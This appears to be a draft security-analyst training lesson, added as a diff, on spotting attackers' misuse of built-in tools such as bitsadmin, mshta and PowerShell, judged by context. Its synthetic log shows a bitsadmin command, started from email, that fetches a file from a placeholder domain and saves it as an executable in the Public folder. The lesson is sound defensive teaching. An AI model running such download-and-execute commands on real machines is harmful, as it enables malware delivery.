@@ -1,0 +1,133 @@
+---
+id: soc-l1-lotl-01
+title: "Living off the Land: When Normal Tools Do Abnormal Things"
+track: soc
+rank: 1
+module: endpoint
+order: 24
+estimated_minutes: 15
+objectives_covered: ["soc:soc_endpoint_triage"]
+mitre: ["T1218", "T1105", "T1059.001", "T1047"]
+xp: 110
+status: draft
+review_status: agent-checked
+last_reviewed: null
+prerequisites: ["soc-l1-timelines-trees-01"]
+skills: ["soc_endpoint_triage"]
+practice: ["family:soc-f-attachment-script-01", "drill:drill-06"]
+---
+
+> **Outcome:** you can recognise when a built-in system tool is being used for an attack, using context rather than the tool's name.
+
+## Why this matters on shift
+
+Many attackers no longer bring their own malware for every step. They use the tools already installed on every Windows and Linux machine: shells, scripting engines, file transfer helpers, admin utilities. Those tools are signed by the operating system vendor and used by IT every day, so blocking them is rarely possible and their names alone tell you nothing. You have to judge them by how and why they are being used.
+
+## Before you start
+
+You should already know:
+
+- How to build a timeline and read a process tree: [Timelines and Process Trees](/learn/soc-l1-timelines-trees-01).
+
+## Core ideas
+
+### What living off the land means
+
+**Living off the land** means an attacker using legitimate tools that are already on the system, instead of bringing their own, so their activity blends in with normal administration.
+
+Think of a burglar who does not bring a crowbar but uses the ladder and tools already in the victim's garden shed. Nothing they used is out of place in the garden. What is out of place is a ladder against the bedroom window at 3 a.m.
+
+A **LOLBin** (living-off-the-land binary) is a built-in, trusted program that can be misused to download files, run code or bypass controls. The community LOLBAS project documents many of them for Windows, and GTFOBins does the same for Unix-like systems.
+
+### Common misuses
+
+- **Running code through a trusted program** (ATT&CK T1218, System Binary Proxy Execution): for example `rundll32.exe` loading a DLL from a temporary folder, or `mshta.exe` running a script page from the internet.
+- **Downloading tools** (T1105, Ingress Tool Transfer): built-in programs that can fetch files, such as `bitsadmin`, `curl` or PowerShell, pulling a file from a new domain into a user-writable folder.
+- **Scripting** (T1059.001): PowerShell with hidden windows, encoded commands or in-memory downloads.
+- **Remote management** (T1047, Windows Management Instrumentation, and remote PowerShell): running commands on other machines, which is also how attackers move laterally.
+
+### Context is the whole game
+
+The tool name never decides. Context does:
+
+<FlowDiagram
+  title="Judging a built-in tool"
+  description="Ask who ran it, what started it, what arguments it was given, where it reached and where it wrote, and whether this is normal for this user and machine. A tool that is common for IT can still be abnormal in this context."
+  steps={[
+    { label: "Who ran it?", detail: "An IT admin account, a service, or an ordinary user?" },
+    { label: "What started it?", detail: "A management tool or a document, browser or script?" },
+    { label: "Which arguments?", detail: "Download, hidden, encoded, or loading from temp folders?" },
+    { label: "Where did it reach and write?", detail: "Internal servers and program folders, or new domains and user folders?" },
+    { label: "Is this normal here?", detail: "Compare with the machine's and user's baseline." },
+  ]}
+/>
+
+In plain English: the same ladder is fine for cleaning gutters in daylight and alarming against a window at night. Judge the situation, not the ladder.
+
+## Worked example
+
+An alert fires at Larkspur Freight: "Built-in transfer tool downloading a file". The analyst finds two matching events today:
+
+<LogBlock
+  title="Matching events (synthetic)"
+  lines={[
+    "08:30  ws-0xx (37 hosts)  parent: SoftDeployAgent.exe (SYSTEM)",
+    "       bitsadmin /transfer pkg https://deploy.larkspur.example/pkgs/viewer-2.4.msi C:\\ProgramData\\SoftDeploy\\viewer-2.4.msi",
+    "16:12  ws-221 (user b.sato)  parent: mshta.exe  <- parent: outlook.exe",
+    "       bitsadmin /transfer job1 https://sync-cdn-files.example/k.dat C:\\Users\\Public\\k.exe",
+  ]}
+/>
+
+**The false lead is the big one.** The 08:30 event appears on 37 machines, which looks like a widespread attack. But it was started by the company's software deployment agent running as SYSTEM, it downloads from Larkspur's own deployment server into the agent's folder, and a change record covers the viewer update. This is normal use.
+
+**The real one is a single event.** At 16:12 on ws-221 the same tool did something different. It was started by `mshta.exe`, which was itself started by the mail client. It downloaded from an unfamiliar domain, and it fetched a file called `k.dat` but saved it as the program `k.exe` in the Public folder. Every piece of context is wrong: the parent chain starts from email, the destination is new, the target folder is user-writable, and the file is renamed into a program.
+
+The analyst closes the deployment alerts as benign true positives with the change reference, and escalates ws-221: mail to mshta (T1218.005), followed by a tool download (T1105).
+
+## Try it
+
+<MicroExercise id="lotl-context" />
+
+## Common mistakes
+
+- **Judging by tool name.** Both events above used the same program.
+- **Assuming signed means safe.** These tools are signed by the operating system vendor; that is why attackers use them.
+- **Being alarmed by volume alone.** Deployment tools run on hundreds of machines at once.
+- **Ignoring renamed files.** A file saved with a different extension from the one it was downloaded as is a strong signal.
+- **Forgetting Linux.** curl, wget, cron and shell tricks are living off the land too.
+
+## What good looks like
+
+A strong analyst knows the common LOLBins, never decides on a name, and walks through who ran it, from what, with which arguments, to where, and whether that is normal here. They can explain in one sentence why the same tool is fine on one machine and malicious on another.
+
+## In the real world
+
+Detection teams write behaviour rules for risky argument patterns and unusual parents, and tune them with allow-lists for deployment and management tools. Many organisations restrict or monitor rarely needed LOLBins more tightly. The LOLBAS and GTFOBins projects are useful references when you meet an unfamiliar built-in tool.
+
+In the simulator's attachment scenario family, built-in tools appear in both harmful and harmless forms on purpose, so the name alone will not tell you which is which.
+
+## Remember it like this
+
+Same tool, different story: who, from what, with what arguments, to where, and is it normal here?
+
+## Interview answer
+
+"Living off the land means attackers using tools that are already installed and trusted, like PowerShell, rundll32, mshta or bitsadmin, so nothing looks foreign. I never judge by the name. I look at who ran it, the parent chain, the arguments, where it connected and wrote, and whether that's normal for that machine and user. A deployment agent downloading from our own server is routine; the same tool launched from email, fetching from a new domain into the Public folder, is an attack."
+
+## Check your understanding
+
+<TerminalCheck />
+
+## Key terms
+
+<KeyTerms
+  terms={[
+    { term: "Living off the land", definition: "An attacker using legitimate tools already on a system, instead of their own malware, so the activity blends in." },
+    { term: "LOLBin", definition: "A built-in, trusted program that can be misused to download files, run code or bypass controls." },
+    { term: "Ingress tool transfer", definition: "Bringing attacker tools or files onto a compromised system, often with a built-in download tool (ATT&CK T1105)." },
+  ]}
+/>
+
+## Practice this
+
+<PracticeThis />
